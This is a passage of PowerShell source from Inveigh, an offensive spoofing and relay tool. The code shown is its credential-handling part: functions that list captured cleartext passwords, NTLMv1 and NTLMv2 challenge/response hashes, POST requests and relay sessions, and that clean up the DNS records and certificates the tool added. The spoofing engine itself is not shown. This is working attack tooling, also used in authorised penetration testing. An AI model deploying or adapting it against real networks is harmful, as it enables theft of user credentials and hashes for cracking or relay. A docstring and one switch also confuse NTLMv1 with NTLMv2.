            if($ConsoleStatus -and $console_status_stopwatch.Elapsed -ge $console_status_timeout)
            {
            
                if($inveigh.cleartext_list.Count -gt 0)
                {
                    Write-Output("[*] [$(Get-Date -format s)] Current unique cleartext captures:" + $inveigh.newline)
                    $inveigh.cleartext_list.Sort()

                    foreach($unique_cleartext in $inveigh.cleartext_list)
                    {
                        if($unique_cleartext -ne $unique_cleartext_last)
                        {
                            Write-Output($unique_cleartext + $inveigh.newline)
                        }

                        $unique_cleartext_last = $unique_cleartext
                    }

                    Start-Sleep -m 5
                }
                else
                {
                    Write-Output("[+] [$(Get-Date -format s)] No cleartext credentials have been captured" + $inveigh.newline)
                }

                if($inveigh.POST_request_list.Count -gt 0)
                {
                    Write-Output("[*] [$(Get-Date -format s)] Current unique POST request captures:" + $inveigh.newline)
                    $inveigh.POST_request_list.Sort()

                    foreach($unique_POST_request in $inveigh.POST_request_list)
                    {
                        if($unique_POST_request -ne $unique_POST_request_last)
                        {
                            Write-Output($unique_POST_request + $inveigh.newline)
                        }

                        $unique_POST_request_last = $unique_POST_request
                    }

                    Start-Sleep -m 5
                }
            
                if($inveigh.NTLMv1_list.Count -gt 0)
                {
                    Write-Output("[*] [$(Get-Date -format s)] Current unique NTLMv1 challenge/response captures:" + $inveigh.newline)
                    $inveigh.NTLMv1_list.Sort()

                    foreach($unique_NTLMv1 in $inveigh.NTLMv1_list)
                    {
                        $unique_NTLMv1_account = $unique_NTLMv1.SubString(0,$unique_NTLMv1.IndexOf(":",($unique_NTLMv1.IndexOf(":") + 2)))

                        if($unique_NTLMv1_account -ne $unique_NTLMv1_account_last)
                        {
                            Write-Output($unique_NTLMv1 + $inveigh.newline)
                        }

                        $unique_NTLMv1_account_last = $unique_NTLMv1_account
                    }

                    $unique_NTLMv1_account_last = ''
                    Start-Sleep -m 5
                    Write-Output("[*] [$(Get-Date -format s)] Current NTLMv1 IP addresses and usernames:" + $inveigh.newline)

                    foreach($NTLMv1_username in $inveigh.NTLMv1_username_list)
                    {
                        Write-Output($NTLMv1_username + $inveigh.newline)
                    }

                    Start-Sleep -m 5
                }
                else
                {
                    Write-Output("[+] [$(Get-Date -format s)] No NTLMv1 challenge/response hashes have been captured" + $inveigh.newline)
                }

                if($inveigh.NTLMv2_list.Count -gt 0)
                {
                    Write-Output("[*] [$(Get-Date -format s)] Current unique NTLMv2 challenge/response captures:" + $inveigh.newline)
                    $inveigh.NTLMv2_list.Sort()

                    foreach($unique_NTLMv2 in $inveigh.NTLMv2_list)
                    {
                        $unique_NTLMv2_account = $unique_NTLMv2.SubString(0,$unique_NTLMv2.IndexOf(":",($unique_NTLMv2.IndexOf(":") + 2)))

                        if($unique_NTLMv2_account -ne $unique_NTLMv2_account_last)
                        {
                            Write-Output($unique_NTLMv2 + $inveigh.newline)
                        }

                        $unique_NTLMv2_account_last = $unique_NTLMv2_account
                    }

                    $unique_NTLMv2_account_last = ''
                    Start-Sleep -m 5
                    Write-Output("[*] [$(Get-Date -format s)] Current NTLMv2 IP addresses and usernames:" + $inveigh.newline)

                    foreach($NTLMv2_username in $inveigh.NTLMv2_username_list)
                    {
                        Write-Output($NTLMv2_username + $inveigh.newline)
                    }
                
                }
                else
                {
                    Write-Output("[+] [$(Get-Date -format s)] No NTLMv2 challenge/response hashes have been captured" + $inveigh.newline)
                }

                $console_status_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()

            }

            if($inveigh.console_input)
            {

                if([Console]::KeyAvailable)
                {
                    $inveigh.console_output = $false
                    BREAK console_loop
                }
        
            }

            Start-Sleep -m 5
        }

    }

}
finally
{

    if($Tool -eq 2)
    {
        $inveigh.relay_running = $false
    }

}

}
#End Invoke-InveighRelay

function Stop-Inveigh
{
<#
.SYNOPSIS
Stop-Inveigh will stop all running Inveigh functions.
#>

if($inveigh)
{

    if($inveigh.running -or $inveigh.relay_running)
    {

        if($inveigh.DNS_list.Count -gt 0)
        {

            foreach($DNS_host in $inveigh.DNS_list)
            {
 
                if($DNS_host.StartsWith("1,"))
                {

                    $DNS_update = Invoke-DNSUpdate -DNSType A -DNSName $DNS_host.SubString(2)

                    if($DNS_update -eq "[+] DNS update successful")
                    {
                        $output = "[+] [$(Get-Date -format s)] DNS host (A) record for " + $DNS_host.SubString(2) + " removed"
                        Write-Output $output
                    }
                    else
                    {
                        $output = "[-] [$(Get-Date -format s)] DNS host (A) record for " + $DNS_host.SubString(2) + " remove failed"
                        Write-Warning $output
                    }

                    if($inveigh.file_output)
                    {
                        $output | Out-File $Inveigh.log_out_file -Append   
                    }

                    if($inveigh.log_output)
                    {
                        $inveigh.log.Add($output)  > $null
                    }

                }

            }

            $inveigh.DNS_list = New-Object System.Collections.ArrayList
            $inveigh.requested_host_list = New-Object System.Collections.ArrayList
            $inveigh.requested_host_IP_list = New-Object System.Collections.ArrayList
        }

        if($inveigh.HTTPS -and !$inveigh.HTTPS_existing_certificate -or ($inveigh.HTTPS_existing_certificate -and $inveigh.HTTPS_force_certificate_delete))
        {

            try
            {
                $certificate_store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
                $certificate_store.Open('ReadWrite')
                $certificates = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Issuer -Like "CN=" + $inveigh.certificate_issuer})

                ForEach($certificate in $certificates)
                {
                    $certificate_store.Remove($certificate)
                }

                $certificate_store.Close()
            }
            catch
            {
                $output = "[-] [$(Get-Date -format s)] SSL Certificate Deletion Error [Remove Manually]"

                if($inveigh.file_output)
                {
                    $output | Out-File $Inveigh.log_out_file -Append   
                }

                if($inveigh.log_output)
                {
                    $inveigh.log.Add($output)  > $null
                }

                Write-Warning $output
            }

        }
            
        if($inveigh.relay_running)
        {
            $output = "[*] [$(Get-Date -format s)] Inveigh Relay is exiting"

            if($inveigh.file_output)
            {
                $output | Out-File $Inveigh.log_out_file -Append
            }

            if($inveigh.log_output)
            {
                $inveigh.log.Add($output)  > $null
            }

            Write-Output $output
            $inveigh.relay_running = $false
        } 

        if($inveigh.running)
        {
            $output = "[*] [$(Get-Date -format s)] Inveigh is exiting"

            if($inveigh.file_output)
            {
                $output | Out-File $Inveigh.log_out_file -Append
            }

            if($inveigh.log_output)
            {
                $inveigh.log.Add($output)  > $null
            }

            Write-Output $output
            $inveigh.running = $false
        }

        $inveigh.HTTPS = $false
        Start-Sleep -S 5
    }
    else
    {
        Write-Output "[-] There are no running Inveigh functions"
    }

}

}

function Get-Inveigh
{
<#
.SYNOPSIS
Get-Inveigh will get stored Inveigh data from memory.

.PARAMETER Console
Get queued console output. This is also the default if no parameters are set.

.PARAMETER DNS
Get added DNS host records.

.PARAMETER DNSFailed
Get failed DNS host record adds.

.PARAMETER Learning
Get valid hosts discovered through spoofer learning.

.PARAMETER Log
Get log entries.

.PARAMETER Cleartext
Get captured cleartext credentials.

.PARAMETER CleartextUnique
Get unique captured cleartext credentials.

.PARAMETER NTLMv1
Get captured NTLMv1 challenge/response hashes.

.PARAMETER NTLMv1Unique
Get the first captured NTLMv1 challenge/response for each unique account.

.PARAMETER NTLMv1Usernames
Get IP addresses and usernames for captured NTLMv1 challenge/response hashes.

.PARAMETER NTLMv2
Get captured NTLMv1 challenge/response hashes.

.PARAMETER NTLMv2Unique
Get the first captured NTLMv2 challenge/response for each unique account.

.PARAMETER NTLMv2Usernames
Get IP addresses and usernames for captured NTLMv2 challenge/response hashes.

.PARAMETER POSTRequest
Get captured POST requests.

.PARAMETER POSTRequestUnique
Get unique captured POST request.

.PARAMETER Session
Get relay session list.
#>

    [CmdletBinding()]
    param
    ( 
        [parameter(Mandatory=$false)][Switch]$Cleartext,
        [parameter(Mandatory=$false)][Switch]$CleartextUnique,
        [parameter(Mandatory=$false)][Switch]$Console,
        [parameter(Mandatory=$false)][Switch]$DNS,
        [parameter(Mandatory=$false)][Switch]$DNSFailed,
        [parameter(Mandatory=$false)][Switch]$Learning,
        [parameter(Mandatory=$false)][Switch]$Log,
        [parameter(Mandatory=$false)][Switch]$NTLMv1,
        [parameter(Mandatory=$false)][Switch]$NTLMv2,
        [parameter(Mandatory=$false)][Switch]$NTLMv1Unique,
        [parameter(Mandatory=$false)][Switch]$NTLMv2Unique,
        [parameter(Mandatory=$false)][Switch]$NTLMv1Usernames,
        [parameter(Mandatory=$false)][Switch]$NTLMv2Usernames,
        [parameter(Mandatory=$false)][Switch]$POSTRequest,
        [parameter(Mandatory=$false)][Switch]$POSTRequestUnique,
        [parameter(Mandatory=$false)][Switch]$Session,
        [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
    )

    if($Console -or $PSBoundParameters.Count -eq 0)
    {

        while($inveigh.console_queue.Count -gt 0)
        {

            if($inveigh.output_stream_only)
            {
                Write-Output($inveigh.console_queue[0] + $inveigh.newline)
                $inveigh.console_queue.RemoveAt(0)
            }
            else
            {

                switch -wildcard ($inveigh.console_queue[0])
                {

                    {$_ -like "?`[`!`]*" -or $_ -like "?`[-`]*"}
                    {
                        Write-Warning $inveigh.console_queue[0]
                        $inveigh.console_queue.RemoveAt(0)
                    }

                    default
                    {
                        Write-Output $inveigh.console_queue[0]
                        $inveigh.console_queue.RemoveAt(0)
                    }

                }

            }
            
        }

    }

    if($DNS)
    {

        foreach($DNS in $inveigh.DNS_list)
        {
            
            if($DNS.StartsWith("1,"))
            {
                Write-Output $DNS.Substring(2)
            }

        }

    }

    if($DNSFailed)
    {

        foreach($DNS in $inveigh.DNS_list)
        {
            
            if($DNS.StartsWith("0,"))
            {
                Write-Output $DNS.Substring(2)
            }

        }

    }

    if($Log)
    {
        Write-Output $inveigh.log
    }

    if($NTLMv1)
    {
        Write-Output $inveigh.NTLMv1_list
    }

    if($NTLMv1Unique)
    {
        $inveigh.NTLMv1_list.Sort()

        foreach($unique_NTLMv1 in $inveigh.NTLMv1_list)
        {
            $unique_NTLMv1_account = $unique_NTLMv1.SubString(0,$unique_NTLMv1.IndexOf(":",($unique_NTLMv1.IndexOf(":") + 2)))

            if($unique_NTLMv1_account -ne $unique_NTLMv1_account_last)
            {
                Write-Output $unique_NTLMv1
            }

            $unique_NTLMv1_account_last = $unique_NTLMv1_account
        }

    }

    if($NTLMv1Usernames)
    {
        Write-Output $inveigh.NTLMv2_username_list
    }

    if($NTLMv2)
    {
        Write-Output $inveigh.NTLMv2_list
    }

    if($NTLMv2Unique)
    {
        $inveigh.NTLMv2_list.Sort()

        foreach($unique_NTLMv2 in $inveigh.NTLMv2_list)
        {
            $unique_NTLMv2_account = $unique_NTLMv2.SubString(0,$unique_NTLMv2.IndexOf(":",($unique_NTLMv2.IndexOf(":") + 2)))

            if($unique_NTLMv2_account -ne $unique_NTLMv2_account_last)
            {
                Write-Output $unique_NTLMv2
            }

            $unique_NTLMv2_account_last = $unique_NTLMv2_account
        }

    }

    if($NTLMv2Usernames)
    {
        Write-Output $inveigh.NTLMv2_username_list
    }

    if($Cleartext)
    {
        Write-Output $inveigh.cleartext_list
    }

    if($CleartextUnique)
    {
        Write-Output $inveigh.cleartext_list | Get-Unique
    }

    if($POSTRequest)
    {
        Write-Output $inveigh.POST_request_list
    }

    if($POSTRequestUnique)
    {
        Write-Output $inveigh.POST_request_list | Get-Unique
    }

    if($Learning)
    {
        Write-Output $inveigh.valid_host_list
    }

    if($Session)
    {
        $i = 0

        while($i -lt $inveigh.session_socket_table.Count)
        {

            if(!$inveigh.session_socket_table[$i].Connected)
            {
                $inveigh.session_list[$i] | Where-Object {$_.Status = "disconnected"}
            }
        
            $i++
        }

        Write-Output $inveigh.session_list | Format-Table -AutoSize
    }

}

function Watch-Inveigh
{
<#
.SYNOPSIS
Watch-Inveigh will enabled real time console output. If using this function through a shell, test to ensure that it doesn't hang the shell.

.PARAMETER ConsoleOutput
(Medium,Low) Medium and Low can be used to reduce output.
#>

[CmdletBinding()]
param
( 
    [parameter(Mandatory=$false)][ValidateSet("Low","Medium")][String]$ConsoleOutput = "Y",
    [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
)

if($inveigh.tool -ne 1)
{

    if($inveigh.running -or $inveigh.relay_running)
    {
        Write-Output "[*] Press any key to stop real time console output"
        $inveigh.console_output = $true

        :console_loop while((($inveigh.running -or $inveigh.relay_running) -and $inveigh.console_output) -or ($inveigh.console_queue.Count -gt 0 -and $inveigh.console_output))
        {

            while($inveigh.console_queue.Count -gt 0)
            {

                switch -wildcard ($inveigh.console_queue[0])
                {

                    {$_ -like "?`[`!`]*" -or $_ -like "?`[-`]*"}
                    {
                        Write-Warning $inveigh.console_queue[0]
                        $inveigh.console_queue.RemoveAt(0)
                    }

                    {$_ -like "* spoofer is disabled" -or $_ -like "* local request" -or $_ -like "* host header *" -or $_ -like "* user agent received *"}
                    {

                        if($ConsoleOutput -eq 'Y')
                        {
                            Write-Output $inveigh.console_queue[0]
                        }

                        $inveigh.console_queue.RemoveAt(0)

                    } 

                    {$_ -like "* response sent" -or $_ -like "* ignoring *" -or $_ -like "* HTTP*request for *" -or $_ -like "* Proxy request for *"}
                    {
                    
                        if($ConsoleOutput -ne "Low")
                        {
                            Write-Output $inveigh.console_queue[0]
                        }

                        $inveigh.console_queue.RemoveAt(0)

                    } 

                    default
                    {
                        Write-Output $inveigh.console_queue[0]
                        $inveigh.console_queue.RemoveAt(0)
                    }

                } 

            }

            if([Console]::KeyAvailable)
            {
                $inveigh.console_output = $false
                BREAK console_loop
            }

            Start-Sleep -m 5
        }

    }
    else
    {
        Write-Output "[-] Inveigh isn't running"
    }

}
else
{
    Write-Output "[-] Watch-Inveigh cannot be used with current external tool selection"
}

}

function Clear-Inveigh
{
<#
.SYNOPSIS
Clear-Inveigh will clear Inveigh data from memory.
#>

if($inveigh)
{

    if(!$inveigh.running -and !$inveigh.relay_running)
    {
        Remove-Variable inveigh -scope global
        Write-Output "[+] Inveigh data has been cleared from memory"
    }
    else
    {
        Write-Output "[-] Run Stop-Inveigh before running Clear-Inveigh"
    }

}

}